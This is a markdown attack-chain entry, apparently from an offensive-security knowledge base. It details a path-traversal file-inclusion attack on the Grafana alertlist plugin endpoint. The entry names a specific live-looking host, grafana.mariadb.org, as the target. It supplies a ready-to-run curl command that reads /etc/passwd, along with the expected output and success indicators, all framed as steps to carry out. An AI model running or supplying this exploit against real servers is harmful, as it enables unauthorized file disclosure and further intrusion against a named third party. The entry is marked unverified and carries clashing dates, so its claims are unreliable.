---
tags:
  - lfi
  - path-traversal
  - grafana
  - file-inclusion
  - information-disclosure
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/curl-lfi-grafana]]'
platforms:
  - Web
  - Linux
complexity: medium
procedures:
  - '[[procedures/Exploit-LFI-in-Grafana-Alertlist-Endpoint]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
description: >-
  A single-stage attack exploiting a Local File Inclusion vulnerability in the
  Grafana public/plugins/alertlist endpoint to read arbitrary local files on the
  server.
skill_level: intermediate
impact_level: medium
id: 35e821a5-dc17-4f83-8cab-e3d82313cb4f
created_at: '2025-12-14T17:26:27.305Z'
updated_at: '2025-12-14T17:26:27.305Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Local File Inclusion via Path Traversal in Grafana Alertlist Plugin

## Overview

This attack chain demonstrates exploiting a Local File Inclusion (LFI) vulnerability in the Grafana instance hosted at https://grafana.mariadb.org. The flaw exists in the public/plugins/alertlist endpoint, where insufficient path validation allows directory traversal using multiple '../' sequences. An attacker can construct a malicious URL to read sensitive local files, such as /etc/passwd, leading to information disclosure including system users, configurations, and potentially credentials. The vulnerability enables unauthorized access to server files without authentication, rated as medium severity due to the potential for exposing sensitive data that could aid further attacks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via LFI] --> B[File Disclosure]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-lfi-grafana]]

### Target Environment

- Web application running Grafana
- Exposed public/plugins/alertlist endpoint
- Linux-based server (inferred from /etc/passwd access)

### Initial Access Requirements

- Network access to the Grafana instance (e.g., https://grafana.mariadb.org)
- No authentication required for the public endpoint
- Basic understanding of URL encoding and path traversal

## Detailed Attack Procedures

### Step 1: Exploit LFI for File Disclosure
procedure: [[procedures/Exploit-LFI-in-Grafana-Alertlist-Endpoint]]

**Objective**: Traverse directories to include and read arbitrary local files from the Grafana server, such as system user files.

**Instructions**: Construct a URL with path traversal payloads using multiple '../' sequences to bypass restrictions and access files outside the intended directory. Use [[commands/curl-lfi-grafana]] to send the request and capture the response:

```bash
curl "https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd" -o output.txt
```

Review the output file for the contents of /etc/passwd, which lists user accounts and home directories.

**Expected Output**: The response body contains the raw contents of the targeted file, e.g., user entries like 'root:x:0:0:root:/root:/bin/bash'.

**Success Indicators**:
- HTTP response includes file contents without errors
- No 404 or access denied messages
- Visible system information in the output, confirming traversal success

## Attack Chain Summary

### Key Achievements

1. Successful directory traversal to read /etc/passwd
2. Disclosure of system user accounts and configurations
3. Potential identification of further attack vectors from exposed data

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01*
